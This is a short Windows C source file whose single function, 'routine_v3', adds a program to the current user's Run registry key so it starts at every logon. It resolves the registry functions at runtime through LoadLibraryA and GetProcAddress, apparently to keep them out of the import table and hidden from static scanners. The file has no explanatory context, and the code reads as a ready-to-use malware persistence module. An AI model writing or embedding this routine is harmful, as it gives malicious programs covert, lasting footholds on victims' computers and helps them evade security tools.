#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* name, const char* path){
    typedef LSTATUS (WINAPI *ROKEA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS (WINAPI *RSVEA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS (WINAPI *RCK)(HKEY);

    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    if (hAdv) {
        ROKEA pOpen = (ROKEA)GetProcAddress(hAdv, "RegOpenKeyExA");
        RSVEA pSet = (RSVEA)GetProcAddress(hAdv, "RegSetValueExA");
        RCK pClose = (RCK)GetProcAddress(hAdv, "RegCloseKey");

        HKEY hKey;
        if (pOpen(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            pSet(hKey, name, 0, REG_SZ, (const BYTE*)path, lstrlenA(path) + 1);
            pClose(hKey);
        }
    }
}